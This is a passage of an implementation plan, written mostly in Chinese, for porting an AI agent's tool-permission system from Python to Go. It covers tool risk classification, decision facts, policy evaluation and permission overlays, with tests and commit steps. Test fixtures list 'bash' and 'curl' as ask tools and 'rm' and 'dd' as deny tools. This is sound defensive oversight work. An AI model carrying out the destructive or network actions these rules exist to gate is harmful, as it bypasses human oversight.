		"heartbeat_list_jobs": {}, "heartbeat_get_job": {}, "heartbeat_preview_job": {},
		"read_terminal_output": {}, "wait_for_terminal_exit": {}, "convert_timestamp_to_utc8_time": {},
		"tool_search": {}, "skill_index": {}, "list_skill": {}, "get_current_goal": {},
		"recall_compressed_context": {},
	}
	askUserTools          = map[string]struct{}{"ask_user": {}}
	skillReadTools        = map[string]struct{}{"skill_tool": {}}
	skillChangeTools      = map[string]struct{}{"install_skill": {}, "uninstall_skill": {}}
	skillDiscoveryTools   = map[string]struct{}{"search_skill": {}}
	externalSendTools     = map[string]struct{}{
		"send_file_to_user": {}, "upload_file": {}, "upload_photo": {}, "send_message": {},
	}
	deviceTools = map[string]struct{}{
		"call_phone": {}, "save_media_to_gallery": {}, "save_file_to_file_manager": {},
	}
	memoryWriteTools = map[string]struct{}{
		"write_memory": {}, "edit_memory": {}, "viking_remember": {},
		"viking_add_resource": {}, "mem0_conclude": {},
		"coding_memory_write": {}, "coding_memory_edit": {},
	}
	localMemoryReadTools = map[string]struct{}{
		"memory_get": {}, "memory_search": {}, "read_memory": {},
	}
	reviewedMemoryReadTools = map[string]struct{}{
		"coding_memory_read": {}, "ltm_search": {}, "ltm_search_summary": {},
		"mem0_profile": {}, "mem0_search": {},
		"viking_browse": {}, "viking_read": {}, "viking_search": {},
	}
	fixedBrowserTools = map[string]struct{}{
		"browser_phase": {}, "browser_probe_cards": {},
		"browser_probe_interactives": {}, "browser_recall_offload": {},
	}
	dynamicRepresentativeTools = map[string]struct{}{
		"browser_click": {}, "browser_open": {}, "browser_run_task": {}, "browser_snapshot": {},
		"cron_create_job": {}, "cron_delete_job": {}, "cron_preview_job": {},
		"mcp_unknown_tool": {}, "todo_create": {}, "todo_list": {},
	}
	trustedBrowserMCPServerPrefixes = []string{
		"mcp_playwright-official_browser_",
		"mcp_playwright_official_browser_",
	}
	trustedBrowserMCPToolSuffixes = map[string]struct{}{
		"click": {}, "close": {}, "console_messages": {}, "drag": {}, "drop": {},
		"evaluate": {}, "file_upload": {}, "fill_form": {}, "handle_dialog": {},
		"hover": {}, "navigate": {}, "navigate_back": {}, "network_request": {},
		"network_requests": {}, "press_key": {}, "route": {}, "resize": {},
		"run_code_unsafe": {}, "select_option": {}, "snapshot": {}, "tabs": {},
		"take_screenshot": {}, "type": {}, "unroute": {}, "wait_for": {},
	}
	// staticCanonicalToolNames 所有静态已知的规范名（26 个集合的并集 + xiaoyi_gui_agent）
	staticCanonicalToolNames map[string]struct{}
)

// init 构建 staticCanonicalToolNames。
//
// Python: _STATIC_CANONICAL_TOOL_NAMES = frozenset(set(PERMISSION_TOOL_ALIASES.values()) | ... )
func init() {
	sets := []map[string]struct{}{
		shellTools, codeTools, pathToolsSet, publicSearchTools, publicWebReadTools,
		subagentTools, subagentRuntimeControlTools, hostTodoTools, legacyTodoTools,
		sessionStatusTools, sessionSendTools, sessionMessageManagementTools,
		internalReadonlyTools, askUserTools, skillReadTools, skillChangeTools,
		skillDiscoveryTools, externalSendTools, deviceTools, memoryWriteTools,
		localMemoryReadTools, reviewedMemoryReadTools, fixedBrowserTools,
		dynamicRepresentativeTools,
	}
	total := 1
	for _, m := range sets {
		total += len(m)
	}
	staticCanonicalToolNames = make(map[string]struct{}, total+4)
	for _, m := range sets {
		for k := range m {
			staticCanonicalToolNames[k] = struct{}{}
		}
	}
	// 别名映射的目标值也是规范名
	for _, target := range permissionToolsAliasValues() {
		staticCanonicalToolNames[target] = struct{}{}
	}
	staticCanonicalToolNames["xiaoyi_gui_agent"] = struct{}{}
}

// ──────────────────────────── 导出函数 ────────────────────────────

// ShellToolNames 返回 shell 类工具名，已排序。
//
// Python: shell_tool_names()
func ShellToolNames() []string {
	out := make([]string, 0, len(shellTools))
	for name := range shellTools {
		out = append(out, name)
	}
	sort.Strings(out)
	return out
}

// NormalizeToolName 把前端或别名工具名归一化为策略工具名。
//
// Python: normalize_tool_name(tool_name)
func NormalizeToolName(toolName string) string {
	return permission_tools.NormalizePermissionToolName(toolName)
}

// ──────────────────────────── 非导出函数 ────────────────────────────

// permissionToolsAliasValues 取别名映射的全部目标值。
func permissionToolsAliasValues() []string {
	return []string{
		"mcp_exec_command", "mcp_fetch_webpage",
		"mcp_free_search", "mcp_paid_search",
	}
}
```

- [ ] **Step 4: 实现 `ClassifyTool` 的 28 个分支**

```go
// ClassifyTool 返回规范化工具名的能力事实。
//
// 28 个分支的顺序即优先级，不可调换。最易错的是 branch 2（内部只读）
// 先于 branch 14（cron_ 前缀）：cron_list_jobs 走 internal_readonly/low，
// 只有非只读的 cron_* 才落到 schedule_change/high。
//
// Python: classify_tool(tool_name)
func ClassifyTool(toolName string) ToolCapability {
	canonicalNames := make([]string, 0, len(staticCanonicalToolNames))
	for name := range staticCanonicalToolNames {
		canonicalNames = append(canonicalNames, name)
	}
	resolution := permission_tools.ResolvePermissionToolName(toolName, canonicalNames)
	normalized := resolution.CanonicalName
	lowered := strings.ToLower(normalized)

	// 1. 别名冲突 → fail-closed
	if resolution.Conflict {
		return newCapability(resolution, "unknown", "unknown", "unknown", nil, "high", true, true)
	}
	// 2. 内部只读（必须先于 cron_ 前缀分支）
	if _, hit := internalReadonlyTools[strings.TrimSpace(toolName)]; hit && len(resolution.Aliases) == 0 {
		category := "task_management"
		if strings.HasPrefix(lowered, "cron_") {
			category = "cron"
		}
		return newCapability(resolution, category, "internal_readonly", "internal_state", nil, "low", false, true)
	}
	// 3. shell
	if _, hit := shellTools[lowered]; hit {
		return newCapability(resolution, "shell", "dynamic_execution", "command",
			[]string{"dynamic_exec"}, "high", true, true)
	}
	// 4. code
	if _, hit := codeTools[lowered]; hit {
		return newCapability(resolution, "code", "dynamic_execution", "code",
			[]string{"dynamic_exec"}, "high", true, true)
	}
	// 5. path
	if _, hit := pathToolsSet[lowered]; hit {
		var sideEffects []string
		risk := "low"
		family := "workspace_read"
		if isPathWriteTool(lowered) {
			sideEffects = []string{"write_local"}
			risk = "medium"
			family = "workspace_write"
		}
		return newCapability(resolution, "path", family, "workspace_path", sideEffects, risk, false, true)
	}
	// 6. 公开搜索
	if _, hit := publicSearchTools[lowered]; hit {
		return newCapability(resolution, "network", "public_search", "public_web",
			[]string{"network_search"}, "medium", false, true)
	}
	// 7. 公开网页读取
	if _, hit := publicWebReadTools[lowered]; hit {
		return newCapability(resolution, "network", "public_web_read", "public_web",
			[]string{"network_read"}, "medium", false, true)
	}
	// 8. 宿主 todo
	if _, hit := hostTodoTools[lowered]; hit {
		return newCapability(resolution, "task_management", "task_state", "session_task_state", nil, "low", false, true)
	}
	// 9. 遗留 todo（非权威）
	if _, hit := legacyTodoTools[lowered]; hit {
		return newCapability(resolution, "task_management", "task_state", "session_task_state", nil, "medium", true, false)
	}
	// 10. 会话状态
	if _, hit := sessionStatusTools[lowered]; hit {
		return newCapability(resolution, "task_management", "session_status", "session_task_state", nil, "low", false, true)
	}
	// 11. 跨会话发送
	if _, hit := sessionSendTools[lowered]; hit {
		return newCapability(resolution, "task_management", "cross_session_send", "product_session",
			[]string{"delegation"}, "high", true, true)
	}
	// 12. 跨会话消息管理
	if _, hit := sessionMessageManagementTools[lowered]; hit {
		return newCapability(resolution, "task_management", "cross_session_resolution", "product_session",
			[]string{"session_state_write"}, "high", true, true)
	}
	// 13. 用户交互
	if _, hit := askUserTools[lowered]; hit {
		return newCapability(resolution, "interaction", "ask_user", "user_interaction", nil, "low", false, true)
	}
	// 14. cron 变更（非权威）
	if strings.HasPrefix(lowered, "cron_") {
		return newCapability(resolution, "cron", "schedule_change", "schedule",
			[]string{"schedule"}, "high", true, false)
	}
	// 15. subagent 运行时控制（必须精确且无别名）
	if isExactSubagentRuntimeControl(toolName, resolution) {
		return newCapability(resolution, "subagent", "subagent_runtime_control", "agent_runtime",
			[]string{"delegation"}, "low", false, true)
	}
	// 16. subagent 控制（只有 task_tool 权威）
	if _, hit := subagentTools[lowered]; hit {
		return newCapability(resolution, "subagent", "subagent_control", "agent_runtime",
			[]string{"delegation"}, "high", true, lowered == "task_tool")
	}
	// 17. 固定 browser 工具
	if _, hit := fixedBrowserTools[lowered]; hit {
		family := "browser_session_observe"
		var sideEffects []string = []string{"session_cache_write"}
		if lowered == "browser_recall_offload" {
			family = "browser_session_recall"
			sideEffects = nil
		}
		return newCapability(resolution, "browser", family, "browser_session", sideEffects, "low", false, true)
	}
	// 18. 动态 browser 工具（非权威）
	if strings.HasPrefix(lowered, "browser_") || lowered == "xiaoyi_gui_agent" || isTrustedBrowserMCPTool(lowered) {
		return newCapability(resolution, "browser", "browser_action", "browser_session",
			[]string{"browser_action"}, "high", true, false)
	}
	// 19-21. skill
	if _, hit := skillDiscoveryTools[lowered]; hit {
		return newCapability(resolution, "skill", "skill_discovery", "skill_catalog", nil, "medium", false, true)
	}
	if _, hit := skillReadTools[lowered]; hit {
		return newCapability(resolution, "skill", "skill_read", "installed_skill", nil, "low", false, true)
	}
	if _, hit := skillChangeTools[lowered]; hit {
		return newCapability(resolution, "skill", "skill_change", "skill_catalog",
			[]string{"skill_change"}, "high", true, true)
	}
	// 22. 外部发送
	if _, hit := externalSendTools[lowered]; hit {
		return newCapability(resolution, "external_send", "external_send", "external_recipient",
			[]string{"external_send"}, "high", true, true)
	}
	// 23. 设备操作
	if _, hit := deviceTools[lowered]; hit {
		return newCapability(resolution, "device", "device_action", "user_device",
			[]string{"device_action"}, "high", true, true)
	}
	// 24. 记忆写入
	if _, hit := memoryWriteTools[lowered]; hit {
		return newCapability(resolution, "memory", "memory_write", "memory_store",
			[]string{"memory_write"}, "high", true, true)
	}
	// 25. 本地记忆读取
	if _, hit := localMemoryReadTools[lowered]; hit {
		family := "memory_read"
		if lowered == "memory_search" {
			family = "memory_search"
		}
		return newCapability(resolution, "memory", family, "memory_store", nil, "low", false, true)
	}
	// 26. 需审查的记忆读取（非权威）
	if _, hit := reviewedMemoryReadTools[lowered]; hit {
		family := "memory_read"
		switch lowered {
		case "ltm_search", "ltm_search_summary", "mem0_search", "viking_search":
			family = "memory_search"
		}
		return newCapability(resolution, "memory", family, "memory_store", nil, "medium", true, false)
	}
	// 27. 未知 mcp（非权威）
	if strings.HasPrefix(lowered, "mcp_") {
		return newCapability(resolution, "mcp", "unknown_mcp", "external_resource", nil, "high", true, false)
	}
	// 28. 兜底（非权威）
	return newCapability(resolution, "unknown", "unknown", "unknown", nil, "high", true, false)
}
```

- [ ] **Step 5: 实现 `newCapability` 与 `redactionKey`**

注意 `FactsSource` 的三元推导：

```go
factsSource := nameClassificationHint
if resolution.Conflict || category == "unknown" {
	factsSource = unknownFacts
} else if authoritative {
	factsSource = hostStaticFacts
}
```

- [ ] **Step 6: 跑测试 + 覆盖率**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" -cover ./internal/swarm/agents/harness/common/rails/permissions/ -run TestClassifyTool -v 2>&1 | tail -20
```

Expected: 全部 PASS。

- [ ] **Step 7: 提交**

```bash
gofmt -l internal/swarm/agents/harness/common/rails/permissions/
git add internal/swarm/agents/harness/common/rails/permissions/tool_capabilities.go \
        internal/swarm/agents/harness/common/rails/permissions/tool_capabilities_test.go
git commit -m "feat(permissions): 工具能力分类（tool_capabilities.py 615 行）

classify_tool 的 28 个分支逐条照抄，顺序不可调换。最易错的是
branch 2（内部只读）先于 branch 14（cron_ 前缀）：cron_list_jobs 走
internal_readonly/low，只有非只读的 cron_* 才落到 schedule_change/high。

FactsSource 三态：conflict 或 unknown → unknown；authoritative →
host_static；否则 name_classification_hint。"
git show --stat HEAD
```

---

## Task 14：`permissions/tool_decision_facts.go`

**Files:**
- Create: `internal/swarm/agents/harness/common/rails/permissions/tool_decision_facts.go`
- Create: `internal/swarm/agents/harness/common/rails/permissions/tool_decision_facts_test.go`
- Read: `/home/opensource/jiuwenswarm-develop/jiuwenswarm/agents/harness/common/rails/permissions/tool_decision_facts.py`（182 行）

- [ ] **Step 1: 写失败测试——`_core_accesses` 的五个分支**

```go
// TestBuildToolDecisionFacts_native短路 测试 native path 优先
// TestBuildToolDecisionFacts_send_file 测试 send_file_to_user 用 send_paths
// TestBuildToolDecisionFacts_非path类 测试非 path/shell 类返回空且 known=true
// TestBuildToolDecisionFacts_root为nil 测试无 workspace 时 known=false
// TestBuildToolDecisionFacts_lsp特殊 测试 lsp + workspaceSymbol 把 root 当 file_path
// TestBuildToolDecisionFacts_shell命令 测试 shell 类提取 command 字段
// TestDecisionRoute_allowedOutcomes 测试四种 source 的 allowed_outcomes
```

每个用例的具体代码从 Python 行为反推，例如：

```go
// TestDecisionRoute_allowedOutcomes 测试四种来源的允许结果集
func TestDecisionRoute_allowedOutcomes(t *testing.T) {
	cases := []struct {
		source   string
		want     []string
	}{
		{"semantic_reviewer", []string{"allow_once", "manual", "deny"}},
		{"recent_search_result", []string{"allow_once", "manual", "deny"}},
		{"manual_only", []string{"manual", "deny"}},
		{"hard_guard", []string{}},
	}
	for _, c := range cases {
		r := DecisionRoute{Source: c.source}
		got := r.AllowedOutcomes()
		if !reflect.DeepEqual(got, c.want) {
			t.Errorf("source=%s: AllowedOutcomes = %v, want %v", c.source, got, c.want)
		}
	}
}
```

- [ ] **Step 2: 实现**

```go
// ToolDecisionFacts 一次已归一化调用的宿主事实（只有权威事实；参数值不可信）。
//
// Python: @dataclass(frozen=True, slots=True) ToolDecisionFacts
type ToolDecisionFacts struct {
	Capability            ToolCapability
	UntrustedArgs         map[string]any
	ArgumentsValidObject  bool
	AccessesKnown         bool
	ReadPaths             []string
	WritePaths            []string
	ExternalPaths         []string
	Command               string
	WorkspaceRoot         string
	PlatformTrustedRoot   string
}

// ToolName 返回能力分类里的工具名。
//
// Python: ToolDecisionFacts.tool_name（property）
func (f ToolDecisionFacts) ToolName() string { return f.Capability.ToolName }

// ToolCategory 返回能力分类的 category。
//
// Python: ToolDecisionFacts.tool_category（property）
func (f ToolDecisionFacts) ToolCategory() string { return f.Capability.Category }

// Paths 返回读路径与写路径的去重并集（保持首次出现顺序）。
//
// Python: ToolDecisionFacts.paths（property）
func (f ToolDecisionFacts) Paths() []string {
	seen := make(map[string]struct{}, len(f.ReadPaths)+len(f.WritePaths))
	out := make([]string, 0, len(f.ReadPaths)+len(f.WritePaths))
	for _, p := range append(append([]string{}, f.ReadPaths...), f.WritePaths...) {
		if _, dup := seen[p]; dup {
			continue
		}
		seen[p] = struct{}{}
		out = append(out, p)
	}
	return out
}

// DecisionRoute 一次紧凑的宿主路由结果。
//
// Python: @dataclass(frozen=True, slots=True) DecisionRoute
type DecisionRoute struct {
	Level  string
	Reason string
	Source string
}

// IsHardBlock 是否为硬拦截。
//
// Python: DecisionRoute.is_hard_block（property）
func (r DecisionRoute) IsHardBlock() bool { return r.Source == "hard_guard" }

// RequiresManual 是否需要人工确认。
//
// Python: DecisionRoute.requires_manual（property）
func (r DecisionRoute) RequiresManual() bool { return r.Source == "manual_only" }

// RequiresReviewer 是否需要语义审查。
//
// Python: DecisionRoute.requires_reviewer（property）
func (r DecisionRoute) RequiresReviewer() bool { return r.Source == "semantic_reviewer" }

// IsDeterministicAllow 是否为确定性放行。
//
// Python: DecisionRoute.is_deterministic_allow（property）
func (r DecisionRoute) IsDeterministicAllow() bool { return r.Source == "recent_search_result" }

// Accepted 是否可接受（非硬拦截）。
//
// Python: DecisionRoute.accepted（property）
func (r DecisionRoute) Accepted() bool { return !r.IsHardBlock() }

// AllowedOutcomes 本路由允许的结果集。
//
// Python: DecisionRoute.allowed_outcomes（property）
func (r DecisionRoute) AllowedOutcomes() []string {
	if r.RequiresReviewer() || r.IsDeterministicAllow() {
		return []string{"allow_once", "manual", "deny"}
	}
	if r.RequiresManual() {
		return []string{"manual", "deny"}
	}
	return nil
}

// NoAutoAllowReason 不可自动放行的原因；仅 manual_only 时给出。
//
// Python: DecisionRoute.no_auto_allow_reason（property）
func (r DecisionRoute) NoAutoAllowReason() string {
	if r.RequiresManual() {
		return r.Reason
	}
	return ""
}

// BuildToolDecisionFacts 投影适配器、Core 访问与 Engine 的既有事实，不重新解析。
//
// Python: build_tool_decision_facts(tool_name, tool_args, *, workspace_root,
//            platform_trusted_root=None, original_args_were_valid_object,
//            external_paths=(), send_paths=())
func BuildToolDecisionFacts(
	toolName string,
	toolArgs map[string]any,
	workspaceRoot string,
	platformTrustedRoot string,
	originalArgsWereValidObject bool,
	externalPaths []string,
	sendPaths []string,
) ToolDecisionFacts {
	capability := ClassifyTool(toolName)

	args := make(map[string]any, len(toolArgs))
	for k, v := range toolArgs {
		args[k] = v
	}
	root := workspaceRootOf(workspaceRoot)
	platformRoot := workspaceRootOf(platformTrustedRoot)

	readPaths, writePaths, accessesKnown := coreAccesses(capability, args, root, sendPaths)

	command := ""
	if capability.Category == "shell" {
		if v, ok := args["command"].(string); ok && v != "" {
			command = strings.TrimSpace(v)
		} else if v, ok := args["cmd"].(string); ok {
			command = strings.TrimSpace(v)
		}
	}

	return ToolDecisionFacts{
		Capability:           capability,
		UntrustedArgs:        args,
		ArgumentsValidObject: originalArgsWereValidObject,
		AccessesKnown:        accessesKnown,
		ReadPaths:            readPaths,
		WritePaths:           writePaths,
		ExternalPaths:        dedupStrings(externalPaths),
		Command:              command,
		WorkspaceRoot:        root,
		PlatformTrustedRoot:  platformRoot,
	}
}

// workspaceRootOf 把路径规整为绝对 posix 形式，失败返回空串。
//
// Python: _workspace_root(value)
func workspaceRootOf(value string) string {
	if strings.TrimSpace(value) == "" {
		return ""
	}
	abs, err := filepath.Abs(value)
	if err != nil {
		return ""
	}
	return filepath.ToSlash(abs)
}

// coreAccesses 抽取核心访问，五个分支顺序不可调换。
//
//  1. native path 短路（Smart 场景）
//  2. send_file_to_user 用 send_paths
//  3. 非 path/shell 类 → 空且 known=true
//  4. 无 workspace root → 空且 known=false
//  5. extract_accesses_native 抽取；异常 → 空且 known=false
//
// known 的最终判定：shell 类恒 true；其余看是否抽到路径。
//
// Python: _core_accesses(capability, args, root, *, send_paths)
func coreAccesses(capability ToolCapability, args map[string]any, root string, sendPaths []string) ([]string, []string, bool) {
	// 1. native path
	if native := CurrentNativePathAccess(capability.ToolName, args); native != nil {
		if native.Action == "read" {
			return []string{native.Path}, nil, true
		}
		return nil, []string{native.Path}, true
	}
	// 2. send_file_to_user
	if capability.ToolName == "send_file_to_user" {
		paths := make([]string, 0, len(sendPaths))
		for _, p := range sendPaths {
			if p != "" {
				paths = append(paths, p)
			}
		}
		deduped := dedupStrings(paths)
		return deduped, nil, len(deduped) > 0
	}
	// 3. 非 path/shell 类
	if capability.Category != "path" && capability.Category != "shell" {
		return nil, nil, true
	}
	// 4. 无 root
	if root == "" {
		return nil, nil, false
	}
	// 5. extract_accesses_native
	accessArgs := args
	// lsp + workspaceSymbol 把 root 当 file_path（Python 的 workaround）
	if capability.ToolName == "lsp" {
		if op, ok := args["operation"].(string); ok && op == "workspaceSymbol" {
			accessArgs = make(map[string]any, len(args)+1)
			for k, v := range args {
				accessArgs[k] = v
			}
			accessArgs["file_path"] = root
		}
	}
	accesses := fileguardExtractAccesses(capability.ToolName, accessArgs, root)
	if accesses == nil {
		return nil, nil, false
	}

	reads := make([]string, 0, len(accesses))
	writes := make([]string, 0, len(accesses))
	for _, acc := range accesses {
		normalized := acc.Path
		if acc.Action == fileguardActionWrite || acc.Action == fileguardActionExec {
			if !containsString(writes, normalized) {
				writes = append(writes, normalized)
			}
			continue
		}
		if !containsString(reads, normalized) {
			reads = append(reads, normalized)
		}
	}
	known := capability.Category == "shell" || len(reads) > 0 || len(writes) > 0
	return reads, writes, known
}
```

**跨包依赖**：`coreAccesses` 调 `fileguard.ExtractAccessesNative`。但 `permissions` 包 import `fileguard` 会让 `fileguard` 反向依赖？不会——`fileguard` 只依赖 `security`，不依赖 `permissions`。

```go
import (
	"github.com/uapclaw/uapclaw-go/internal/agentcore/harness/security/fileguard"
)

// 类型别名，避免本文件到处写 fileguard. 前缀
type fileguardAccess = fileguard.FileAccess

const (
	fileguardActionWrite = fileguard.FileActionWrite
	fileguardActionExec  = fileguard.FileActionExec
)

// fileguardExtractAccesses 薄包装，nil 表示抽取失败。
func fileguardExtractAccesses(toolName string, args map[string]any, workspace string) []fileguardAccess {
	defer func() {
		_ = recover() // Python 侧 catch (OSError, RuntimeError, TypeError, ValueError)
	}()
	return fileguard.ExtractAccessesNative(toolName, args, workspace, nil)
}
```

> **`fileguardExtractAccesses` 的 panic 恢复**：`ExtractAccessesNative` 内部若因路径解析抛出 panic（Go 的 `filepath` 不抛，但自定义逻辑可能有），需 recover 后返回 nil 表示失败。用具名返回值：

```go
// fileguardExtractAccesses 薄包装，nil 表示抽取失败（含 panic 恢复）。
func fileguardExtractAccesses(toolName string, args map[string]any, workspace string) (out []fileguardAccess) {
	defer func() {
		if rec := recover(); rec != nil {
			logger.Warn(logComponent).Interface("recover", rec).
				Msg("permission.facts.extract_accesses_failed")
			out = nil
		}
	}()
	return fileguard.ExtractAccessesNative(toolName, args, workspace, nil)
}

- [ ] **Step 3: 跑测试 + 提交**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/swarm/agents/harness/common/rails/permissions/ -run 'TestBuildToolDecisionFacts|TestDecisionRoute' -v 2>&1 | tail
gofmt -l internal/swarm/agents/harness/common/rails/permissions/
git add internal/swarm/agents/harness/common/rails/permissions/tool_decision_facts.go \
        internal/swarm/agents/harness/common/rails/permissions/tool_decision_facts_test.go
git commit -m "feat(permissions): 单次调用的决策事实（tool_decision_facts.py 182 行）

coreAccesses 五个分支顺序不可调换：native path 短路 → send_file 用
send_paths → 非 path/shell 类空且 known=true → 无 workspace known=false
→ extract_accesses_native。

lsp + workspaceSymbol 把 workspace root 塞进 file_path 是 Python 的
workaround，照抄。"
git show --stat HEAD
```

---

## Task 15：`permissions/policy_eval.go`

**Files:**
- Create: `internal/swarm/agents/harness/common/rails/permissions/policy_eval.go`
- Create: `internal/swarm/agents/harness/common/rails/permissions/policy_eval_test.go`
- Read: `/home/opensource/jiuwenswarm-develop/jiuwenswarm/agents/harness/common/rails/permissions/policy_eval.py`（375 行）

- [ ] **Step 1: 写失败测试——`strictestEvaluation` 的合并语义**

```go
// TestStrictestEvaluation_取最严并合并规则 测试 matched_rule 跨全部候选去重合并
func TestStrictestEvaluation_取最严并合并规则(t *testing.T) {
	allow := &PolicyEvaluation{Level: "allow", Reason: "r1", MatchedRule: "rule_a", Source: "scene_hook"}
	ask := &PolicyEvaluation{Level: "ask", Reason: "r2", MatchedRule: "rule_b|rule_c", Source: "permission_engine"}
	deny := &PolicyEvaluation{Level: "deny", Reason: "r3", MatchedRule: "rule_d", Source: "file_guard_adapter"}

	got := strictestEvaluation(allow, ask, deny, nil)
	if got.Level != "deny" {
		t.Errorf("Level = %q, want deny", got.Level)
	}
	if got.Reason != "r3" {
		t.Errorf("Reason = %q, want r3（取最严那条的 reason）", got.Reason)
	}
	// matched_rule 跨全部候选合并
	want := "rule_a|rule_b|rule_c|rule_d"
	if got.MatchedRule != want {
		t.Errorf("MatchedRule = %q, want %q", got.MatchedRule, want)
	}
}

// TestStrictestEvaluation_忽略nil 测试 nil 候选被跳过
func TestStrictestEvaluation_忽略nil(t *testing.T) {
	allow := &PolicyEvaluation{Level: "allow", Reason: "r", MatchedRule: "a"}
	got := strictestEvaluation(nil, allow, nil, nil)
	if got.Level != "allow" {
		t.Errorf("Level = %q, want allow", got.Level)
	}
}

// TestValidatedExternalPaths 测试外部路径列表的三重上限校验
func TestValidatedExternalPaths(t *testing.T) {
	// nil → 空元组（不是 nil，表示合法但空）
	if got := validatedExternalPaths(nil); got == nil || len(got) != 0 {
		t.Errorf("nil 应返回空切片，got %v", got)
	}
	// 超过 64 条 → 非法（返回 nil）
	tooMany := make([]any, 65)
	for i := range tooMany {
		tooMany[i] = "/p"
	}
	if got := validatedExternalPaths(tooMany); got != nil {
		t.Errorf("65 条应返回 nil（非法），got %v", got)
	}
	// 单条超 4096 → 非法
	long := strings.Repeat("a", 4097)
	if got := validatedExternalPaths([]any{long}); got != nil {
		t.Errorf("超长路径应返回 nil，got %v", got)
	}
	// 非字符串项 → 非法
	if got := validatedExternalPaths([]any{123}); got != nil {
		t.Errorf("非字符串项应返回 nil，got %v", got)
	}
	// 正常
	if got := validatedExternalPaths([]any{"/a", "/b"}); len(got) != 2 {
		t.Errorf("正常应为 2 条，got %v", got)
	}
}
```

- [ ] **Step 2: 实现**

`PolicyEvaluation` + `OpenJiuwenPolicyEvaluator` 及 19 个符号。**`evaluate` 的 7 步顺序不可调换**（spec §3.13），特别注意第 3 步与第 5 步**各 apply 一次 config**。

- [ ] **Step 3: send_file 分支留 ⤵️**

```go
	// ⤵️ 9.90e 回填：SendFilePathGuardEvaluator 未实现，path_result 恒 nil。
	// 9.90e 落地 send_file_path_guard.py（315 行）后在此构造并调用。
	var pathResult *SendFilePathGuardResult
	if normalizedToolName == sendFileToolName {
		// pathResult = e.pathGuardEvaluator.Evaluate(...)
	}
```

- [ ] **Step 4: 跑测试 + 提交**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/swarm/agents/harness/common/rails/permissions/ -run 'TestStrictestEvaluation|TestValidatedExternalPaths' -v 2>&1 | tail
gofmt -l internal/swarm/agents/harness/common/rails/permissions/
git add internal/swarm/agents/harness/common/rails/permissions/policy_eval.go \
        internal/swarm/agents/harness/common/rails/permissions/policy_eval_test.go
git commit -m "feat(permissions): 影子策略评估（policy_eval.py 375 行）

不弹框的规则复算，供 9.90d 比对 LLM 结论与规则结论的偏离。

evaluate 七步顺序不可调换，其中 apply_config 要调两次（Python 注释
说明 scene hook 可能 await 另一个回调，需在同步判定前重申本次捕获的
输入）；Go 无 await 但保持两次以对齐并发语义。

⤵️ send_file 分支待 9.90e 的 SendFilePathGuardEvaluator。"
git show --stat HEAD
```

---

## Task 16：`permissions/permissions_layers.go`

**Files:**
- Create: `internal/swarm/agents/harness/common/rails/permissions/permissions_layers.go`
- Create: `internal/swarm/agents/harness/common/rails/permissions/permissions_layers_test.go`
- Read: `/home/opensource/jiuwenswarm-develop/jiuwenswarm/agents/harness/common/rails/permissions/permissions_layers.py`（676 行）

- [ ] **Step 0（Task 16a）：先确认 round-trip 能力**

```bash
sed -n '1,60p' /home/opensource/uapclaw-gateway/internal/common/config/roundtrip.go
grep -n "func " /home/opensource/uapclaw-gateway/internal/common/config/roundtrip.go
```

判定：`roundtrip.go` 的 Node 读写逻辑能否抽为「按任意路径」的通用函数？

- 能 → 抽出来复用，登记为无偏差
- 不能 → 在 `permissions_layers.go` 内自建 `loadYAMLDict` / `dumpYAMLDict`，用 `yaml.v3` 的 `Node`，并在 spec 的偏差 D7 下补充说明

**此结论决定后面 Step 的实现方式，必须先跑。**

- [ ] **Step 1: 写失败测试——`_as_permissions_section` 的双形态**

```go
// TestAsPermissionsSection_双形态 测试顶层包装与自身两种形态
func TestAsPermissionsSection_双形态(t *testing.T) {
	// 形态 1：{permissions: {...}} 且自身无 overlay 键 → 取内层
	wrapped := map[string]any{"permissions": map[string]any{"allow_tools": []any{"bash"}}}
	got := asPermissionsSection(wrapped)
	if _, has := got["permissions"]; has {
		t.Error("应取内层，不应保留 permissions 键")
	}
	if tools, _ := got["allow_tools"].([]any); len(tools) != 1 {
		t.Errorf("allow_tools = %v, want 1 项", got["allow_tools"])
	}

	// 形态 2：自身含 overlay 键 → 取自身
	direct := map[string]any{
		"permissions": map[string]any{"allow_tools": []any{"x"}},
		"allow_tools": []any{"bash"},
	}
	got2 := asPermissionsSection(direct)
	if tools, _ := got2["allow_tools"].([]any); len(tools) != 1 || tools[0] != "bash" {
		t.Errorf("应取自身，got allow_tools = %v", got2["allow_tools"])
	}

	// 非 dict → 空
	if got3 := asPermissionsSection("not a map"); len(got3) != 0 {
		t.Errorf("非 map 应返回空，got %v", got3)
	}
}

// TestOverlayFromEffective_askDeny只算global 测试 base_ask/base_deny 只看 global 层
func TestOverlayFromEffective_askDeny只算global(t *testing.T) {
	globalPerms := map[string]any{"ask_tools": []any{"bash"}, "deny_tools": []any{"rm"}}
	effective := map[string]any{"ask_tools": []any{"bash", "curl"}, "deny_tools": []any{"rm", "dd"}}

	overlay := OverlayFromEffective(effective, false, globalPerms, map[string]any{}, map[string]any{})
	// curl 不在 global.ask 里 → 应进 overlay
	ask, _ := overlay["ask_tools"].([]any)
	if len(ask) != 1 || ask[0] != "curl" {
		t.Errorf("ask_tools = %v, want [curl]", ask)
	}
	deny, _ := overlay["deny_tools"].([]any)
	if len(deny) != 1 || deny[0] != "dd" {
		t.Errorf("deny_tools = %v, want [dd]", deny)
	}
}

// TestOverlayFromEffective_session模式不输出askDeny 测试 session 模式去掉 ask/deny
func TestOverlayFromEffective_session模式不输出askDeny(t *testing.T) {
	effective := map[string]any{"ask_tools": []any{"x"}, "deny_tools": []any{"y"}, "allow_tools": []any{"z"}}
	overlay := OverlayFromEffective(effective, true, map[string]any{}, nil, nil)
	if _, has := overlay["ask_tools"]; has {
		t.Error("session 模式不应输出 ask_tools")
	}
	if _, has := overlay["deny_tools"]; has {
		t.Error("session 模式不应输出 deny_tools")
	}
}

// TestOrderedToolNamesAtLevel_顺序敏感 测试 tools 字典序在前、列表在后
func TestOrderedToolNamesAtLevel_顺序敏感(t *testing.T) {
	layer := map[string]any{
		"tools":       mustOrderedMap(t, "b_tool", "a_tool"),   // 插入序 b, a
		"allow_tools": []any{"c_tool", "a_tool"},               // a_tool 重复
	}
	got := orderedToolNamesAtLevel(layer, "allow")
	want := []string{"b_tool", "a_tool", "c_tool"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("got %v, want %v（tools 字典序在前，去重保首次）", got, want)
	}
}

